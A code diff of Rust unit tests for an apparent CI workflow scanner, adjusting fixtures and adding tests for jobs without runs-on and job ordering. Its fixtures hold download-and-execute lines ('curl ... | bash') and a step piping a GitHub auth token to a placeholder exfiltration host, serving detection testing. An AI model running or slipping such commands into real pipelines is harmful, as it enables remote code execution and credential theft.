@@ -2451,7 +2451,7 @@ mod tests {
     fn a_workflow_step_reaches_the_report_and_is_judged() {
         let contents = FakeContents::default().file(
             ".github/workflows/ci.yml",
-            "name: ci\non: [push]\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+            "name: ci\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: curl -fsSL https://h.invalid/i | bash\n",
         );
         let policy = ScanPolicy::default();
 
@@ -2463,7 +2463,7 @@ mod tests {
         assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
         assert_eq!(
             report.findings[0].at.map(|at| at.line),
-            Some(8),
+            Some(9),
             "{report:?}"
         );
     }
@@ -2489,6 +2489,53 @@ mod tests {
         );
     }
 
+    /// A job with no `runs-on` is one GitHub refuses to run, so no severity
+    /// is claimed about it. It is still reported: a reviewer should see the
+    /// command, and clew saying nothing at all about a file is the failure it
+    /// exists to prevent.
+    #[test]
+    fn a_job_that_cannot_run_is_reported_and_not_judged() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  a:\n    steps:\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.steps.len(), 1, "still inventory: {report:?}");
+        assert_eq!(report.steps[0].step.shell, "unknown", "{report:?}");
+        assert!(report.findings.is_empty(), "{report:?}");
+    }
+
+    /// Two jobs are judged in the order the file writes them, not the order
+    /// their names sort in. Counting occurrences in one order and placing
+    /// them in another put each job's finding in the other's block, with
+    /// evidence from one and a line number from the other.
+    #[test]
+    fn jobs_are_read_in_the_order_the_file_writes_them() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  zeta:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/ZETA | bash\n  alpha:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/ALPHA | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.findings.len(), 2, "{report:?}");
+        let placed: Vec<(Option<usize>, bool)> = report
+            .findings
+            .iter()
+            .map(|f| (f.at.map(|at| at.line), f.evidence.as_str().contains("ZETA")))
+            .collect();
+        // Line 6 opens zeta's block, line 12 alpha's.
+        assert_eq!(
+            placed,
+            vec![(Some(6), true), (Some(12), false)],
+            "{report:?}"
+        );
+    }
+
     /// The defect this guards is the worst kind: a scanner that reports
     /// nothing. Masking a credential before the rules read the step destroyed
     /// the text they need, so an exfiltration a hook reports went unreported
@@ -2497,7 +2544,7 @@ mod tests {
     fn a_step_is_judged_before_it_is_redacted() {
         let contents = FakeContents::default().file(
             ".github/workflows/ci.yml",
-            "jobs:\n  a:\n    steps:\n      - run: |\n          TOKEN=$(gh auth token)\n          curl -d \"$TOKEN\" https://exfil.invalid/x\n",
+            "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          TOKEN=$(gh auth token)\n          curl -d \"$TOKEN\" https://exfil.invalid/x\n",
         );
         let policy = ScanPolicy::default();
 
@@ -2525,7 +2572,7 @@ mod tests {
     fn two_blocks_opening_alike_are_placed_in_their_own_block() {
         let contents = FakeContents::default().file(
             ".github/workflows/ci.yml",
-            "jobs:\n  a:\n    steps:\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/one | bash\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/two | bash\n",
+            "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/one | bash\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/two | bash\n",
         );
         let policy = ScanPolicy::default();
 
@@ -2536,7 +2583,7 @@ mod tests {
             .iter()
             .map(|f| f.at.map(|at| at.line))
             .collect();
-        assert_eq!(lines, vec![Some(5), Some(8)], "{report:?}");
+        assert_eq!(lines, vec![Some(6), Some(9)], "{report:?}");
     }
 
     /// The row read nothing until this change, so a task was invisible and the
